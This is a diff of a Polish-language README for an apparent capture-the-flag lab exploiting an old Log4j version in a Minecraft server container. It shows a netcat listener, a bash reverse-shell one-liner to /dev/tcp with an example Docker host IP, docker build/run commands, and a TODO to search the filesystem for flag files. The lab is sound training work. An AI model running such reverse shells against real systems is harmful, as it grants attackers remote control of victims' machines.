@@ -44,16 +44,19 @@ Wykorzystaj podatność starej wersji Log4j i inne narzędzia do zdobycia ukryte
 nc -l 5000
 
 # Na komputerze ofiary:
-bash -i >& /dev/tcp/[twoje IP]/5000 0>&1
+bash -i >& /dev/tcp/[ip kompa na którym jest `nc` włączony]/5000 0>&1
+
+# przykład:
+bash -i >& /dev/tcp/172.17.0.1/5000 0>&1
 ```
 
 ### Budowanie obrazu:
 ```sh
 # Stworzenie obrazu kontenera:
-docker build . -t nazwa-obrazu
+docker build . -t <nazwa-obrazu>
 
 # Uruchomienie obrazu z przekierowaniem portów:
-docker run -p 25565:25565 -ti
+docker run -p 25565:25565 -ti <nazwa-obrazu>
 ```
 
 ### Konfiguracja EOL w VSCode
@@ -87,7 +90,13 @@ docker container prune
 
 TODO:
 lf w starcie
+
 wejsc na server mc wpisac komende
+
 jak zatrzymać bash -c reverse shell?
+
 echo to wbudowana funkcja basha, a nie żadna binarka 
+
 allready allocated port: docker desktop delete container, 
+
+find / -name "*flag*" 2>/dev/null
